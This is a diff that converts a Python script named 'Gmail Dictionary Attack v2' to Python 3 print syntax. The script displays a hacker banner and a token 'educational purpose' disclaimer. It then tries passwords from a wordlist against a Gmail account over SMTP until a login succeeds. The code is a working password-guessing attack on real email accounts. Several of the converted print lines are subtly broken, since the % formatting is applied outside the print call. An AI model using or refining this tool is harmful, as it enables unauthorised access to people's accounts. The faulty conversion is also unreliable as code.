@@ -1,32 +1,32 @@
 # Program: Gmail Dictionary Attack v2
 
-print"Join Ethical Hacker's Community"
+print("Join Ethical Hacker's Community")
 #Information
-print "Author: Kinghacker0"
-print "YouTube - www.YouTube.com/Hacker's King "
-print "Website - www.hackersking.in"
+print ("Author: Kinghacker0")
+print ("YouTube - www.YouTube.com/Hacker's King ")
+print ("Website - www.hackersking.in")
 
-print"      *                                            *   "
-print"     *                                              *    "
-print"    **                                              **   "
-print"   *   **                                        **   *    "
-print"   **   **  *                               *   **    **   "
-print"   ***    * **    Instagram-@kinghacker0   **  *    ***  "
-print"    ****    ******************************* ***   ****   "
-print"       *******    *****        *******    **********  "
-print"  ***********           *****             ************     "
-print"    **********    *** * **   ** ****    **********     "
-print"         ********** ** **     ** ****************    "
-print"   *************** ** **  ***  **  **********************  "
-print"        ******   ***************************   ******     "
-print"                *************************    "
-print"               **************************  "
-print"               **** ** ** **** ** ** **  "
-print"                ***  *  *  **  *  * ***   "
-print"                 **                 **    "
-print"                   *                *     "
+print("      *                                            *   ")
+print("     *                                              *    ")
+print("    **                                              **   ")
+print("   *   **                                        **   *    ")
+print("   **   **  *                               *   **    **   ")
+print("   ***    * **    Instagram-@kinghacker0   **  *    ***  ")
+print("    ****    ******************************* ***   ****   ")
+print("       *******    *****        *******    **********  ")
+print("  ***********           *****             ************     ")
+print("    **********    *** * **   ** ****    **********     ")
+print("         ********** ** **     ** ****************    ")
+print("   *************** ** **  ***  **  **********************  ")
+print("        ******   ***************************   ******     ")
+print("                *************************    ")
+print("               **************************  ")
+print("               **** ** ** **** ** ** **  ")
+print("                ***  *  *  **  *  * ***   ")
+print("                 **                 **    ")
+print("                   *                *     ")
 
-print" Disclaimer- This tool is only for educational purpose"
+print(" Disclaimer- This tool is only for educational purpose")
 import smtplib
 
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
@@ -41,7 +41,7 @@ for password in passwfile:
 	try:
 		smtpserver.login(user, password)
 
-		print "[+] Password Found: %s" % password
+		print ("[+] Password Found: %s") % password
 		break;
 	except smtplib.SMTPAuthenticationError:
-		print "[!] Password Incorrect: %s" % password
+		print ("[!] Password Incorrect: %s") % password
